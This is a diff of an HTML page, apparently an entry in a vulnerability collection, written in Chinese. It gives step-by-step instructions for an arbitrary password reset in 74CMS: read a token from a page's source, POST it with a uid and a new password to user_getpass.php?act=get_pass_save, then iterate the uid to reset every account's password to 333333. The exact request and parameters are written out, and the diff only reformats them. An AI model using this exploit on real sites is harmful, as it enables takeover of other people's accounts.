@@ -1,15 +1,16 @@
 <meta charset="UTF-8">
 <div>
-    <h3>POST-DATA: </h3>
-    <code>token={token}&uid=2&password=333333</code>
-    <p>ps: 这里的 {token} 是变量,具体看验证过程</p>
-
     <h3>验证过程</h3>
-    <p>先访问 http://example.com/jobs/jobs-list.php</p>
+    <p>先访问</p>
+    <code>http://example.com/jobs/jobs-list.php</code>
     <p>右键查看源代码 找到token的值</p>
     <img src="/vulns/imgs/74CMS_0003.jpg">
-    <p>利用token值构造POST请求 http://example.com/user/user_getpass.php?act=get_pass_save</p>
-    <p>token=b6a0859f6f64ed41&uid=2&password=333333</p>
+    <p>利用token值构造POST请求</p>
+    <p>修改请求头中的data为:</p>
+    <code>token=b6a0859f6f64ed41&uid=2&password=333333</code>
+    <p>再访问</p>
+    <code>http://example.com/user/user_getpass.php?act=get_pass_save</code>
+    <br>
     <img src="/vulns/imgs/74CMS_0003_1.jpg">
     <p>遍历下uid就可以重置任意账号密码为333333</p>
 </div>
